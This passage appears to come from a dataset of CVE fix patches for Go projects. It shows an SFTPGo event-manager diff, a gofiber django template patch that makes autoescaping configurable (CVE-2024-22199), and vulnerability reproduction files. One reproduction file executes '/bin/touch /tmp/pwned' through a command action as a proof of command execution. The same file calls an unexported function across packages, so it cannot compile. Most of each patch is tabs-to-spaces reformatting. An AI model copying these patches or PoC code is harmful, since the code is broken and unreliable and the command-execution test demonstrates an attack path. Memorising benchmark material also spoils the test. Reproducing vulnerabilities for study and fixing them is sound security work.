%q, elapsed: %s\",\n-\t\t\t\t\t\taction.Name, rule.Name, time.Since(startTime))\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t\t// execute async actions if any, including failure actions\n-\t\tgo executeRuleAsyncActions(rule, paramsCopy, failedActions)\n-\t}\n-\n-\treturn errRes\n+        var errRes error\n+\n+        for _, rule := range rules {\n+                var failedActions []string\n+                paramsCopy := params.getACopy()\n+                for _, action := range rule.Actions {\n+                        if !action.Options.IsFailureAction && action.Options.ExecuteSync {\n+                                startTime := time.Now()\n+                                if err := executeRuleAction(action.BaseEventAction, paramsCopy, rule.Conditions.Options); err != nil {\n+                                        eventManagerLog(logger.LevelError, \"unable to execute sync action %q for rule %q, elapsed %s, err: %v\",\n+                                                action.Name, rule.Name, time.Since(startTime), err)\n+                                        failedActions = append(failedActions, action.Name)\n+                                        // we return the last error, it is ok for now\n+                                        errRes = err\n+                                        if action.Options.StopOnFailure {\n+                                                break\n+                                        }\n+                                } else {\n+                                        eventManagerLog(logger.LevelDebug, \"executed sync action %q for rule %q, elapsed: %s\",\n+                                                action.Name, rule.Name, time.Since(startTime))\n+                                }\n+                        }\n+                }\n+                // execute async actions if any, including failure actions\n+                go executeRuleAsyncActions(rule, paramsCopy, failedActions)\n+        }\n+\n+        return errRes\n }\n \n func executeAsyncRulesActions(rules []dataprovider.EventRule, params EventParams) {\n-\teventManager.addAsyncTask()\n-\tdefer eventManager.removeAsyncTask()\n+        eventManager.addAsyncTask()\n+        defer eventManager.removeAsyncTask()\n \n-\tparams.addUID()\n-\tfor _, rule := range rules {\n-\t\texecuteRuleAsyncActions(rule, params.getACopy(), nil)\n-\t}\n+        params.addUID()\n+        for _, rule := range rules {\n+                executeRuleAsyncActions(rule, params.getACopy(), nil)\n+        }\n }\n \n func executeRuleAsyncActions(rule dataprovider.EventRule, params *EventParams, failedActions []string) {\n-\tfor _, action := range rule.Actions {\n-\t\tif !action.Options.IsFailureAction && !action.Options.ExecuteSync {\n-\t\t\tstartTime := time.Now()\n-\t\t\tif err := executeRuleAction(action.BaseEventAction, params, rule.Conditions.Options); err != nil {\n-\t\t\t\teventManagerLog(logger.LevelError, \"unable to execute action %q for rule %q, elapsed %s, err: %v\",\n-\t\t\t\t\taction.Name, rule.Name, time.Since(startTime), err)\n-\t\t\t\tfailedActions = append(failedActions, action.Name)\n-\t\t\t\tif action.Options.StopOnFailure {\n-\t\t\t\t\tbreak\n-\t\t\t\t}\n-\t\t\t} else {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"executed action %q for rule %q, elapsed %s\",\n-\t\t\t\t\taction.Name, rule.Name, time.Since(startTime))\n-\t\t\t}\n-\t\t}\n-\t}\n-\tif len(failedActions) > 0 {\n-\t\tparams.updateStatusFromError = false\n-\t\t// execute failure actions\n-\t\tfor _, action := range rule.Actions {\n-\t\t\tif action.Options.IsFailureAction {\n-\t\t\t\tstartTime := time.Now()\n-\t\t\t\tif err := executeRuleAction(action.BaseEventAction, params, rule.Conditions.Options); err != nil {\n-\t\t\t\t\teventManagerLog(logger.LevelError, \"unable to execute failure action %q for rule %q, elapsed %s, err: %v\",\n-\t\t\t\t\t\taction.Name, rule.Name, time.Since(startTime), err)\n-\t\t\t\t\tif action.Options.StopOnFailure {\n-\t\t\t\t\t\tbreak\n-\t\t\t\t\t}\n-\t\t\t\t} else {\n-\t\t\t\t\teventManagerLog(logger.LevelDebug, \"executed failure action %q for rule %q, elapsed: %s\",\n-\t\t\t\t\t\taction.Name, rule.Name, time.Since(startTime))\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n+        for _, action := range rule.Actions {\n+                if !action.Options.IsFailureAction && !action.Options.ExecuteSync {\n+                        startTime := time.Now()\n+                        if err := executeRuleAction(action.BaseEventAction, params, rule.Conditions.Options); err != nil {\n+                                eventManagerLog(logger.LevelError, \"unable to execute action %q for rule %q, elapsed %s, err: %v\",\n+                                        action.Name, rule.Name, time.Since(startTime), err)\n+                                failedActions = append(failedActions, action.Name)\n+                                if action.Options.StopOnFailure {\n+                                        break\n+                                }\n+                        } else {\n+                                eventManagerLog(logger.LevelDebug, \"executed action %q for rule %q, elapsed %s\",\n+                                        action.Name, rule.Name, time.Since(startTime))\n+                        }\n+                }\n+        }\n+        if len(failedActions) > 0 {\n+                params.updateStatusFromError = false\n+                // execute failure actions\n+                for _, action := range rule.Actions {\n+                        if action.Options.IsFailureAction {\n+                                startTime := time.Now()\n+                                if err := executeRuleAction(action.BaseEventAction, params, rule.Conditions.Options); err != nil {\n+                                        eventManagerLog(logger.LevelError, \"unable to execute failure action %q for rule %q, elapsed %s, err: %v\",\n+                                                action.Name, rule.Name, time.Since(startTime), err)\n+                                        if action.Options.StopOnFailure {\n+                                                break\n+                                        }\n+                                } else {\n+                                        eventManagerLog(logger.LevelDebug, \"executed failure action %q for rule %q, elapsed: %s\",\n+                                                action.Name, rule.Name, time.Since(startTime))\n+                                }\n+                        }\n+                }\n+        }\n }\n \n type eventCronJob struct {\n-\truleName string\n+        ruleName string\n }\n \n func (j *eventCronJob) getTask(rule *dataprovider.EventRule) (dataprovider.Task, error) {\n-\tif rule.GuardFromConcurrentExecution() {\n-\t\ttask, err := dataprovider.GetTaskByName(rule.Name)\n-\t\tif err != nil {\n-\t\t\tif errors.Is(err, util.ErrNotFound) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"adding task for rule %q\", rule.Name)\n-\t\t\t\ttask = dataprovider.Task{\n-\t\t\t\t\tName:     rule.Name,\n-\t\t\t\t\tUpdateAt: 0,\n-\t\t\t\t\tVersion:  0,\n-\t\t\t\t}\n-\t\t\t\terr = dataprovider.AddTask(rule.Name)\n-\t\t\t\tif err != nil {\n-\t\t\t\t\teventManagerLog(logger.LevelWarn, \"unable to add task for rule %q: %v\", rule.Name, err)\n-\t\t\t\t\treturn task, err\n-\t\t\t\t}\n-\t\t\t} else {\n-\t\t\t\teventManagerLog(logger.LevelWarn, \"unable to get task for rule %q: %v\", rule.Name, err)\n-\t\t\t}\n-\t\t}\n-\t\treturn task, err\n-\t}\n-\n-\treturn dataprovider.Task{}, nil\n+        if rule.GuardFromConcurrentExecution() {\n+                task, err := dataprovider.GetTaskByName(rule.Name)\n+                if err != nil {\n+                        if errors.Is(err, util.ErrNotFound) {\n+                                eventManagerLog(logger.LevelDebug, \"adding task for rule %q\", rule.Name)\n+                                task = dataprovider.Task{\n+                                        Name:     rule.Name,\n+                                        UpdateAt: 0,\n+                                        Version:  0,\n+                                }\n+                                err = dataprovider.AddTask(rule.Name)\n+                                if err != nil {\n+                                        eventManagerLog(logger.LevelWarn, \"unable to add task for rule %q: %v\", rule.Name, err)\n+                                        return task, err\n+                                }\n+                        } else {\n+                                eventManagerLog(logger.LevelWarn, \"unable to get task for rule %q: %v\", rule.Name, err)\n+                        }\n+                }\n+                return task, err\n+        }\n+\n+        return dataprovider.Task{}, nil\n }\n \n func (j *eventCronJob) Run() {\n-\teventManagerLog(logger.LevelDebug, \"executing scheduled rule %q\", j.ruleName)\n-\trule, err := dataprovider.EventRuleExists(j.ruleName)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to load rule with name %q\", j.ruleName)\n-\t\treturn\n-\t}\n-\tif err := rule.CheckActionsConsistency(\"\"); err != nil {\n-\t\teventManagerLog(logger.LevelWarn, \"scheduled rule %q skipped: %v\", rule.Name, err)\n-\t\treturn\n-\t}\n-\ttask, err := j.getTask(&rule)\n-\tif err != nil {\n-\t\treturn\n-\t}\n-\tif task.Name != \"\" {\n-\t\tupdateInterval := 5 * time.Minute\n-\t\tupdatedAt := util.GetTimeFromMsecSinceEpoch(task.UpdateAt)\n-\t\tif updatedAt.Add(updateInterval*2 + 1).After(time.Now()) {\n-\t\t\teventManagerLog(logger.LevelDebug, \"task for rule %q too recent: %s, skip execution\", rule.Name, updatedAt)\n-\t\t\treturn\n-\t\t}\n-\t\terr = dataprovider.UpdateTask(rule.Name, task.Version)\n-\t\tif err != nil {\n-\t\t\teventManagerLog(logger.LevelInfo, \"unable to update task timestamp for rule %q, skip execution, err: %v\",\n-\t\t\t\trule.Name, err)\n-\t\t\treturn\n-\t\t}\n-\t\tticker := time.NewTicker(updateInterval)\n-\t\tdone := make(chan bool)\n-\n-\t\tdefer func() {\n-\t\t\tdone <- true\n-\t\t\tticker.Stop()\n-\t\t}()\n-\n-\t\tgo func(taskName string) {\n-\t\t\teventManagerLog(logger.LevelDebug, \"update task %q timestamp worker started\", taskName)\n-\t\t\tfor {\n-\t\t\t\tselect {\n-\t\t\t\tcase <-done:\n-\t\t\t\t\teventManagerLog(logger.LevelDebug, \"update task %q timestamp worker finished\", taskName)\n-\t\t\t\t\treturn\n-\t\t\t\tcase <-ticker.C:\n-\t\t\t\t\terr := dataprovider.UpdateTaskTimestamp(taskName)\n-\t\t\t\t\teventManagerLog(logger.LevelInfo, \"updated timestamp for task %q, err: %v\", taskName, err)\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}(task.Name)\n-\n-\t\texecuteAsyncRulesActions([]dataprovider.EventRule{rule}, EventParams{Status: 1, updateStatusFromError: true})\n-\t} else {\n-\t\texecuteAsyncRulesActions([]dataprovider.EventRule{rule}, EventParams{Status: 1, updateStatusFromError: true})\n-\t}\n-\teventManagerLog(logger.LevelDebug, \"execution for scheduled rule %q finished\", j.ruleName)\n+        eventManagerLog(logger.LevelDebug, \"executing scheduled rule %q\", j.ruleName)\n+        rule, err := dataprovider.EventRuleExists(j.ruleName)\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to load rule with name %q\", j.ruleName)\n+                return\n+        }\n+        if err := rule.CheckActionsConsistency(\"\"); err != nil {\n+                eventManagerLog(logger.LevelWarn, \"scheduled rule %q skipped: %v\", rule.Name, err)\n+                return\n+        }\n+        task, err := j.getTask(&rule)\n+        if err != nil {\n+                return\n+        }\n+        if task.Name != \"\" {\n+                updateInterval := 5 * time.Minute\n+                updatedAt := util.GetTimeFromMsecSinceEpoch(task.UpdateAt)\n+                if updatedAt.Add(updateInterval*2 + 1).After(time.Now()) {\n+                        eventManagerLog(logger.LevelDebug, \"task for rule %q too recent: %s, skip execution\", rule.Name, updatedAt)\n+                        return\n+                }\n+                err = dataprovider.UpdateTask(rule.Name, task.Version)\n+                if err != nil {\n+                        eventManagerLog(logger.LevelInfo, \"unable to update task timestamp for rule %q, skip execution, err: %v\",\n+                                rule.Name, err)\n+                        return\n+                }\n+                ticker := time.NewTicker(updateInterval)\n+                done := make(chan bool)\n+\n+                defer func() {\n+                        done <- true\n+                        ticker.Stop()\n+                }()\n+\n+                go func(taskName string) {\n+                        eventManagerLog(logger.LevelDebug, \"update task %q timestamp worker started\", taskName)\n+                        for {\n+                                select {\n+                                case <-done:\n+                                        eventManagerLog(logger.LevelDebug, \"update task %q timestamp worker finished\", taskName)\n+                                        return\n+                                case <-ticker.C:\n+                                        err := dataprovider.UpdateTaskTimestamp(taskName)\n+                                        eventManagerLog(logger.LevelInfo, \"updated timestamp for task %q, err: %v\", taskName, err)\n+                                }\n+                        }\n+                }(task.Name)\n+\n+                executeAsyncRulesActions([]dataprovider.EventRule{rule}, EventParams{Status: 1, updateStatusFromError: true})\n+        } else {\n+                executeAsyncRulesActions([]dataprovider.EventRule{rule}, EventParams{Status: 1, updateStatusFromError: true})\n+        }\n+        eventManagerLog(logger.LevelDebug, \"execution for scheduled rule %q finished\", j.ruleName)\n }\n \n // RunOnDemandRule executes actions for a rule with on-demand trigger\n func RunOnDemandRule(name string) error {\n-\teventManagerLog(logger.LevelDebug, \"executing on demand rule %q\", name)\n-\trule, err := dataprovider.EventRuleExists(name)\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelDebug, \"unable to load rule with name %q\", name)\n-\t\treturn util.NewRecordNotFoundError(fmt.Sprintf(\"rule %q does not exist\", name))\n-\t}\n-\tif rule.Trigger != dataprovider.EventTriggerOnDemand {\n-\t\teventManagerLog(logger.LevelDebug, \"cannot run rule %q as on demand, trigger: %d\", name, rule.Trigger)\n-\t\treturn util.NewValidationError(fmt.Sprintf(\"rule %q is not defined as on-demand\", name))\n-\t}\n-\tif rule.Status != 1 {\n-\t\teventManagerLog(logger.LevelDebug, \"on-demand rule %q is inactive\", name)\n-\t\treturn util.NewValidationError(fmt.Sprintf(\"rule %q is inactive\", name))\n-\t}\n-\tif err := rule.CheckActionsConsistency(\"\"); err != nil {\n-\t\teventManagerLog(logger.LevelError, \"on-demand rule %q has incompatible actions: %v\", name, err)\n-\t\treturn util.NewValidationError(fmt.Sprintf(\"rule %q has incosistent actions\", name))\n-\t}\n-\teventManagerLog(logger.LevelDebug, \"on-demand rule %q started\", name)\n-\tgo executeAsyncRulesActions([]dataprovider.EventRule{rule}, EventParams{Status: 1, updateStatusFromError: true})\n-\treturn nil\n+        eventManagerLog(logger.LevelDebug, \"executing on demand rule %q\", name)\n+        rule, err := dataprovider.EventRuleExists(name)\n+        if err != nil {\n+                eventManagerLog(logger.LevelDebug, \"unable to load rule with name %q\", name)\n+                return util.NewRecordNotFoundError(fmt.Sprintf(\"rule %q does not exist\", name))\n+        }\n+        if rule.Trigger != dataprovider.EventTriggerOnDemand {\n+                eventManagerLog(logger.LevelDebug, \"cannot run rule %q as on demand, trigger: %d\", name, rule.Trigger)\n+                return util.NewValidationError(fmt.Sprintf(\"rule %q is not defined as on-demand\", name))\n+        }\n+        if rule.Status != 1 {\n+                eventManagerLog(logger.LevelDebug, \"on-demand rule %q is inactive\", name)\n+                return util.NewValidationError(fmt.Sprintf(\"rule %q is inactive\", name))\n+        }\n+        if err := rule.CheckActionsConsistency(\"\"); err != nil {\n+                eventManagerLog(logger.LevelError, \"on-demand rule %q has incompatible actions: %v\", name, err)\n+                return util.NewValidationError(fmt.Sprintf(\"rule %q has incosistent actions\", name))\n+        }\n+        eventManagerLog(logger.LevelDebug, \"on-demand rule %q started\", name)\n+        go executeAsyncRulesActions([]dataprovider.EventRule{rule}, EventParams{Status: 1, updateStatusFromError: true})\n+        return nil\n }\n \n type zipWriterWrapper struct {\n-\tName    string\n-\tEntries map[string]bool\n-\tWriter  *zip.Writer\n+        Name    string\n+        Entries map[string]bool\n+        Writer  *zip.Writer\n }\n \n func eventManagerLog(level logger.LogLevel, format string, v ...any) {\n-\tlogger.Log(level, \"eventmanager\", \"\", format, v...)\n+        logger.Log(level, \"eventmanager\", \"\", format, v...)\n }\ndiff --git a/reproduce_vulnerability.go b/reproduce_vulnerability.go\nnew file mode 100644\nindex 00000000..3ff46d74\n--- /dev/null\n+++ b/reproduce_vulnerability.go\n@@ -0,0 +1,57 @@\n+package main\n+\n+import (\n+\"context\"\n+\"fmt\"\n+\"os\"\n+\n+\"github.com/drakkan/sftpgo/v2/internal/common\"\n+\"github.com/drakkan/sftpgo/v2/internal/dataprovider\"\n+)\n+\n+func main() {\n+// Create a temporary directory for the test\n+tempDir, err := os.MkdirTemp(\"\", \"sftpgo-test\")\n+if err != nil {\n+panic(err)\n+}\n+defer os.RemoveAll(tempDir)\n+\n+// Minimal configuration for the test\n+conf := common.Configuration{\n+TempPath: tempDir,\n+Actions: common.Actions{\n+AllowedCommands: []string{},\n+},\n+}\n+\n+// Initialize the common package\n+if err := common.Initialize(conf, 0); err != nil {\n+panic(err)\n+}\n+\n+// Create an event action to execute a command\n+action := dataprovider.BaseEventAction{\n+Name: \"test-action\",\n+Type: dataprovider.ActionTypeCommand,\n+Options: dataprovider.BaseEventActionOptions{\n+CmdConfig: dataprovider.EventActionCommandConfig{\n+Cmd: \"/bin/touch /tmp/pwned\",\n+},\n+},\n+}\n+\n+// Execute the action\n+_, err = common.ExecuteCommandActionForTest(context.Background(), &action, &common.EventParams{}, dataprovider.EventActionOptions{})\n+if err != nil {\n+fmt.Println(\"Command execution failed as expected:\", err)\n+return\n+}\n+\n+fmt.Println(\"Command executed successfully (vulnerability present)\")\n+}\n+\n+// Exposed for testing\n+func ExecuteCommandActionForTest(ctx context.Context, action *dataprovider.BaseEventAction, params *common.EventParams, options dataprovider.EventActionOptions) (string, error) {\n+return common.executeCommandAction(ctx, action, params, options)\n+}\n"}
{"cve":"CVE-2024-22199:0708", "fix_patch": "diff --git a/django/django.go b/django/django.go\nindex 030fbe2..64900dc 100644\n--- a/django/django.go\n+++ b/django/django.go\n@@ -1,158 +1,158 @@\n package django\n \n import (\n-\t\"fmt\"\n-\t\"io\"\n-\t\"log\"\n-\t\"net/http\"\n-\t\"os\"\n-\t\"path/filepath\"\n-\t\"strings\"\n-\n-\t\"github.com/gofiber/fiber/v2\"\n-\n-\t\"github.com/flosch/pongo2/v6\"\n-\tcore \"github.com/gofiber/template\"\n-\t\"github.com/gofiber/utils\"\n+        \"fmt\"\n+        \"io\"\n+        \"log\"\n+        \"net/http\"\n+        \"os\"\n+        \"path/filepath\"\n+        \"strings\"\n+\n+        \"github.com/gofiber/fiber/v2\"\n+\n+        \"github.com/flosch/pongo2/v6\"\n+        core \"github.com/gofiber/template\"\n+        \"github.com/gofiber/utils\"\n )\n \n // Engine struct\n type Engine struct {\n-\tcore.Engine\n-\t// forward the base path to the template Engine\n-\tforwardPath bool\n-\t// templates\n-\tTemplates map[string]*pongo2.Template\n+        core.Engine\n+        // forward the base path to the template Engine\n+        forwardPath bool\n+        // templates\n+        Templates map[string]*pongo2.Template\n }\n \n // New returns a Django render engine for Fiber\n func New(directory, extension string) *Engine {\n-\tengine := &Engine{\n-\t\tEngine: core.Engine{\n-\t\t\tLeft:       \"{{\",\n-\t\t\tRight:      \"}}\",\n-\t\t\tDirectory:  directory,\n-\t\t\tExtension:  extension,\n-\t\t\tLayoutName: \"embed\",\n-\t\t\tFuncmap:    make(map[string]interface{}),\n-\t\t},\n-\t}\n-\treturn engine\n+        engine := &Engine{\n+                Engine: core.Engine{\n+                        Left:       \"{{\",\n+                        Right:      \"}}\",\n+                        Directory:  directory,\n+                        Extension:  extension,\n+                        LayoutName: \"embed\",\n+                        Funcmap:    make(map[string]interface{}),\n+                },\n+        }\n+        return engine\n }\n \n // NewFileSystem returns a Django render engine for Fiber with file system\n func NewFileSystem(fs http.FileSystem, extension string) *Engine {\n-\tengine := &Engine{\n-\t\tEngine: core.Engine{\n-\t\t\tLeft:       \"{{\",\n-\t\t\tRight:      \"}}\",\n-\t\t\tDirectory:  \"/\",\n-\t\t\tFileSystem: fs,\n-\t\t\tExtension:  extension,\n-\t\t\tLayoutName: \"embed\",\n-\t\t\tFuncmap:    make(map[string]interface{}),\n-\t\t},\n-\t}\n-\treturn engine\n+        engine := &Engine{\n+                Engine: core.Engine{\n+                        Left:       \"{{\",\n+                        Right:      \"}}\",\n+                        Directory:  \"/\",\n+                        FileSystem: fs,\n+                        Extension:  extension,\n+                        LayoutName: \"embed\",\n+                        Funcmap:    make(map[string]interface{}),\n+                },\n+        }\n+        return engine\n }\n \n // NewPathForwardingFileSystem Passes \"Directory\" to the template engine where alternative functions don't.\n //\n-//\tThis fixes errors during resolution of templates when \"{% extends 'parent.html' %}\" is used.\n+//      This fixes errors during resolution of templates when \"{% extends 'parent.html' %}\" is used.\n func NewPathForwardingFileSystem(fs http.FileSystem, directory, extension string) *Engine {\n-\tengine := &Engine{\n-\t\tEngine: core.Engine{\n-\t\t\tLeft:       \"{{\",\n-\t\t\tRight:      \"}}\",\n-\t\t\tDirectory:  directory,\n-\t\t\tFileSystem: fs,\n-\t\t\tExtension:  extension,\n-\t\t\tLayoutName: \"embed\",\n-\t\t\tFuncmap:    make(map[string]interface{}),\n-\t\t},\n-\t\tforwardPath: true,\n-\t}\n-\treturn engine\n+        engine := &Engine{\n+                Engine: core.Engine{\n+                        Left:       \"{{\",\n+                        Right:      \"}}\",\n+                        Directory:  directory,\n+                        FileSystem: fs,\n+                        Extension:  extension,\n+                        LayoutName: \"embed\",\n+                        Funcmap:    make(map[string]interface{}),\n+                },\n+                forwardPath: true,\n+        }\n+        return engine\n }\n \n // Load parses the templates to the engine.\n func (e *Engine) Load() error {\n-\t// race safe\n-\te.Mutex.Lock()\n-\tdefer e.Mutex.Unlock()\n-\n-\te.Templates = make(map[string]*pongo2.Template)\n-\n-\tbaseDir := e.Directory\n-\n-\tvar pongoloader pongo2.TemplateLoader\n-\tif e.FileSystem != nil {\n-\t\t// ensures creation of httpFileSystemLoader only when filesystem is defined\n-\t\tif e.forwardPath {\n-\t\t\tpongoloader = pongo2.MustNewHttpFileSystemLoader(e.FileSystem, baseDir)\n-\t\t} else {\n-\t\t\tpongoloader = pongo2.MustNewHttpFileSystemLoader(e.FileSystem, \"\")\n-\t\t}\n-\t} else {\n-\t\tpongoloader = pongo2.MustNewLocalFileSystemLoader(baseDir)\n-\t}\n-\n-\t// New pongo2 defaultset\n-\tpongoset := pongo2.NewSet(\"default\", pongoloader)\n-\t// Set template settings\n-\tpongoset.Globals.Update(e.Funcmap)\n-\tpongo2.SetAutoescape(false)\n-\n-\t// Loop trough each Directory and register template files\n-\twalkFn := func(path string, info os.FileInfo, err error) error {\n-\t\t// Return error if exist\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\t// Skip file if it's a directory or has no file info\n-\t\tif info == nil || info.IsDir() {\n-\t\t\treturn nil\n-\t\t}\n-\t\t// Skip file if it does not equal the given template Extension\n-\t\tif len(e.Extension) >= len(path) || path[len(path)-len(e.Extension):] != e.Extension {\n-\t\t\treturn nil\n-\t\t}\n-\t\t// Get the relative file path\n-\t\t// ./views/html/index.tmpl -> index.tmpl\n-\t\trel, err := filepath.Rel(e.Directory, path)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\t// Reverse slashes '\\' -> '/' and\n-\t\t// partials\\footer.tmpl -> partials/footer.tmpl\n-\t\tname := filepath.ToSlash(rel)\n-\t\t// Remove ext from name 'index.tmpl' -> 'index'\n-\t\tname = strings.TrimSuffix(name, e.Extension)\n-\t\t// name = strings.Replace(name, e.Extension, \"\", -1)\n-\t\t// Read the file\n-\t\t// #gosec G304\n-\t\tbuf, err := utils.ReadFile(path, e.FileSystem)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\t// Create new template associated with the current one\n-\t\ttmpl, err := pongoset.FromBytes(buf)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\te.Templates[name] = tmpl\n-\t\t// Debugging\n-\t\tif e.Verbose {\n-\t\t\tlog.Printf(\"views: parsed template: %s\\n\", name)\n-\t\t}\n-\t\treturn err\n-\t}\n-\t// notify engine that we parsed all templates\n-\te.Loaded = true\n-\tif e.FileSystem != nil {\n-\t\treturn utils.Walk(e.FileSystem, e.Directory, walkFn)\n-\t}\n-\treturn filepath.Walk(e.Directory, walkFn)\n+        // race safe\n+        e.Mutex.Lock()\n+        defer e.Mutex.Unlock()\n+\n+        e.Templates = make(map[string]*pongo2.Template)\n+\n+        baseDir := e.Directory\n+\n+        var pongoloader pongo2.TemplateLoader\n+        if e.FileSystem != nil {\n+                // ensures creation of httpFileSystemLoader only when filesystem is defined\n+                if e.forwardPath {\n+                        pongoloader = pongo2.MustNewHttpFileSystemLoader(e.FileSystem, baseDir)\n+                } else {\n+                        pongoloader = pongo2.MustNewHttpFileSystemLoader(e.FileSystem, \"\")\n+                }\n+        } else {\n+                pongoloader = pongo2.MustNewLocalFileSystemLoader(baseDir)\n+        }\n+\n+        // New pongo2 defaultset\n+        pongoset := pongo2.NewSet(\"default\", pongoloader)\n+        // Set template settings\n+        pongoset.Globals.Update(e.Funcmap)\n+                pongo2.SetAutoescape(e.AutoEscape)\n+\n+        // Loop trough each Directory and register template files\n+        walkFn := func(path string, info os.FileInfo, err error) error {\n+                // Return error if exist\n+                if err != nil {\n+                        return err\n+                }\n+                // Skip file if it's a directory or has no file info\n+                if info == nil || info.IsDir() {\n+                        return nil\n+                }\n+                // Skip file if it does not equal the given template Extension\n+                if len(e.Extension) >= len(path) || path[len(path)-len(e.Extension):] != e.Extension {\n+                        return nil\n+                }\n+                // Get the relative file path\n+                // ./views/html/index.tmpl -> index.tmpl\n+                rel, err := filepath.Rel(e.Directory, path)\n+                if err != nil {\n+                        return err\n+                }\n+                // Reverse slashes '\\' -> '/' and\n+                // partials\\footer.tmpl -> partials/footer.tmpl\n+                name := filepath.ToSlash(rel)\n+                // Remove ext from name 'index.tmpl' -> 'index'\n+                name = strings.TrimSuffix(name, e.Extension)\n+                // name = strings.Replace(name, e.Extension, \"\", -1)\n+                // Read the file\n+                // #gosec G304\n+                buf, err := utils.ReadFile(path, e.FileSystem)\n+                if err != nil {\n+                        return err\n+                }\n+                // Create new template associated with the current one\n+                tmpl, err := pongoset.FromBytes(buf)\n+                if err != nil {\n+                        return err\n+                }\n+                e.Templates[name] = tmpl\n+                // Debugging\n+                if e.Verbose {\n+                        log.Printf(\"views: parsed template: %s\\n\", name)\n+                }\n+                return err\n+        }\n+        // notify engine that we parsed all templates\n+        e.Loaded = true\n+        if e.FileSystem != nil {\n+                return utils.Walk(e.FileSystem, e.Directory, walkFn)\n+        }\n+        return filepath.Walk(e.Directory, walkFn)\n }\n \n // getPongoBinding creates a pongo2.Context containing\n@@ -165,81 +165,81 @@ func (e *Engine) Load() error {\n //\n // It returns nil if the binding is not one of the supported types.\n func getPongoBinding(binding interface{}) pongo2.Context {\n-\tif binding == nil {\n-\t\treturn nil\n-\t}\n-\tvar bind pongo2.Context\n-\tswitch binds := binding.(type) {\n-\tcase pongo2.Context:\n-\t\tbind = binds\n-\tcase map[string]interface{}:\n-\t\tbind = binds\n-\tcase fiber.Map:\n-\t\tbind = make(pongo2.Context)\n-\t\tfor key, value := range binds {\n-\t\t\t// only add valid keys\n-\t\t\tif isValidKey(key) {\n-\t\t\t\tbind[key] = value\n-\t\t\t}\n-\t\t}\n-\t\treturn bind\n-\t}\n-\n-\t// Remove invalid keys\n-\tfor key := range bind {\n-\t\tif !isValidKey(key) {\n-\t\t\tdelete(bind, key)\n-\t\t}\n-\t}\n-\n-\treturn bind\n+        if binding == nil {\n+                return nil\n+        }\n+        var bind pongo2.Context\n+        switch binds := binding.(type) {\n+        case pongo2.Context:\n+                bind = binds\n+        case map[string]interface{}:\n+                bind = binds\n+        case fiber.Map:\n+                bind = make(pongo2.Context)\n+                for key, value := range binds {\n+                        // only add valid keys\n+                        if isValidKey(key) {\n+                                bind[key] = value\n+                        }\n+                }\n+                return bind\n+        }\n+\n+        // Remove invalid keys\n+        for key := range bind {\n+                if !isValidKey(key) {\n+                        delete(bind, key)\n+                }\n+        }\n+\n+        return bind\n }\n \n // isValidKey checks if the key is valid\n //\n // Valid keys match the following regex: [a-zA-Z0-9_]+\n func isValidKey(key string) bool {\n-\tfor _, ch := range key {\n-\t\tif !((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9') || ch == '_') {\n-\t\t\treturn false\n-\t\t}\n-\t}\n-\treturn true\n+        for _, ch := range key {\n+                if !((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9') || ch == '_') {\n+                        return false\n+                }\n+        }\n+        return true\n }\n \n // Render will render the template by name\n func (e *Engine) Render(out io.Writer, name string, binding interface{}, layout ...string) error {\n-\tif !e.Loaded || e.ShouldReload {\n-\t\tif e.ShouldReload {\n-\t\t\te.Loaded = false\n-\t\t}\n-\t\tif err := e.Load(); err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\ttmpl, ok := e.Templates[name]\n-\tif !ok {\n-\t\treturn fmt.Errorf(\"template %s does not exist\", name)\n-\t}\n-\n-\tbind := getPongoBinding(binding)\n-\tparsed, err := tmpl.Execute(bind)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tif len(layout) > 0 && layout[0] != \"\" {\n-\t\tif bind == nil {\n-\t\t\tbind = make(map[string]interface{}, 1)\n-\t\t}\n-\t\tbind[e.LayoutName] = parsed\n-\t\tlay := e.Templates[layout[0]]\n-\t\tif lay == nil {\n-\t\t\treturn fmt.Errorf(\"LayoutName %s does not exist\", layout[0])\n-\t\t}\n-\t\treturn lay.ExecuteWriter(bind, out)\n-\t}\n-\tif _, err = out.Write([]byte(parsed)); err != nil {\n-\t\treturn err\n-\t}\n-\treturn nil\n+        if !e.Loaded || e.ShouldReload {\n+                if e.ShouldReload {\n+                        e.Loaded = false\n+                }\n+                if err := e.Load(); err != nil {\n+                        return err\n+                }\n+        }\n+        tmpl, ok := e.Templates[name]\n+        if !ok {\n+                return fmt.Errorf(\"template %s does not exist\", name)\n+        }\n+\n+        bind := getPongoBinding(binding)\n+        parsed, err := tmpl.Execute(bind)\n+        if err != nil {\n+                return err\n+        }\n+        if len(layout) > 0 && layout[0] != \"\" {\n+                if bind == nil {\n+                        bind = make(map[string]interface{}, 1)\n+                }\n+                bind[e.LayoutName] = parsed\n+                lay := e.Templates[layout[0]]\n+                if lay == nil {\n+                        return fmt.Errorf(\"LayoutName %s does not exist\", layout[0])\n+                }\n+                return lay.ExecuteWriter(bind, out)\n+        }\n+        if _, err = out.Write([]byte(parsed)); err != nil {\n+                return err\n+        }\n+        return nil\n }\ndiff --git a/django/reproduce_vulnerability_test.go b/django/reproduce_vulnerability_test.go\nnew file mode 100644\nindex 0000000..695d96c\n--- /dev/null\n+++ b/django/reproduce_vulnerability_test.go\n@@ -0,0 +1,39 @@\n+package django\n+\n+import (\n+\"bytes\"\n+\"os\"\n+\"testing\"\n+\n+\"github.com/gofiber/fiber/v2\"\n+\"github.com/stretchr/testify/require\"\n+)\n+\n+func Test_XSS_Vulnerability(t *testing.T) {\n+// Create a temporary directory\n+dir, err := os.MkdirTemp(\".\", \"\")\n+require.NoError(t, err)\n+defer func() {\n+err := 